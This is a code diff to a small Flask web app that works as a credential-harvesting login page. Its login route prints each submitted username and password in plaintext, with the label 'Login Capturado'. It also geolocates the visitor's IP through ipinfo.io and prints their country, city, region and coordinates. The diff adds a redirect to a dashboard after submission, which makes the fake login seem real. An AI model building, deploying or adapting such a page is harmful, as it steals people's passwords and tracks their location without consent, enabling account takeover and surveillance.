@@ -1,15 +1,6 @@
-"""
-Module Docstring:
-This module defines a simple Flask web application for a login page. 
-It captures and prints user login information, including IP address, 
-country, city, region, and location. 
-The application uses the ipinfo.io API to gather geographical 
-information based on the user's IP address.
-"""
-
 from os import urandom
 import requests
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 app.secret_key = urandom(16)
@@ -17,26 +8,11 @@ app.secret_key = urandom(16)
 
 @app.route("/")
 def index():
-    """
-    Render the index.html template for the home page.
-
-    Returns:
-    str: HTML content for the home page.
-    """
     return render_template("index.html")
 
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
-    """
-    Render the login.html template and capture user login information.
-
-    If the request method is POST, capture the username and password 
-    from the form and print the information.
-
-    Returns:
-    str: HTML content for the login page.
-    """
     ip = request.remote_addr
     response = requests.get(f"https://ipinfo.io/{ip}/json")
     data = response.json()
@@ -49,21 +25,26 @@ def login():
         username = request.form["username"]
         password = request.form["password"]
 
-        print(
-            f"""Login Capturado:
-        Username: {username}
-        Password: {password}\n
-        """
-        )
+        print(f"""\n\nLogin Capturado:
+Username: {username}
+Password: {password}\n
+""")
 
-    print(f"\nO endereço IP do usuário é: {ip}")
-    print(f"O pais do usuário é: {pais}")
-    print(f"A cidade do usuario é: {cidade}")
-    print(f"A regiao do ususario é {regiao}")
-    print(f"A loc do ususario é {loc}")
-    print("\n")
+        print(f"O endereço IP do usuário é: {ip}")
+        print(f"O pais do usuário é: {pais}")
+        print(f"A cidade do usuario é: {cidade}")
+        print(f"A regiao do ususario é {regiao}")
+        print(f"A loc do ususario é {loc}")
+        print("\n")
+
+        return redirect("dashboard") 
 
     return render_template("login.html")
+
+
+@app.route("/dashboard")
+def dashboard():
+    return render_template("dashboard.html")
 
 
 if __name__ == "__main__":
